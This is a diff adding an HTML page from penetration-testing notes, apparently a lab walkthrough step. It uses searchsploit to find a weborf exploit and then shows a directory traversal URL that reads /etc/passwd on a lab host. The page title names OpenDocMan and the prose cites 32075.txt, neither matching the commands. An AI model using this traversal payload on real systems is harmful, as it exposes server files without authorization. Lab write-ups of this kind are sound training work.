@@ -1,0 +1,8 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4. Look for vulnerabilities</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><strong>4. Look for vulnerabilities OpenDocMan 1.2.7</strong><br /><br /><div class="codebox"><div class="codebox">$&nbsp;searchsploit&nbsp;weborf<br />$&nbsp;searchsploit&nbsp;-m&nbsp;14925<br />$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;14925.txt<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/95-1.png" alt="images/95-1.png" /><br /><br /><img src="images/95-2.png" alt="images/95-2.png" /><br /><br />Let's see what there is in the 32075.txt file<br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>14925.txt<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/95-3.png" alt="images/95-3.png" /><br /><br />Go to your Web Browser and in the URL, we  injected the line that was displayed by the exploit. This machine is  indeed vulnerable to Directory Traversal. You can read the  /etc/passwd file.<br /><br />http://192.168.12.31:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd<br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/95-4.png" alt="images/95-4.png" /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>
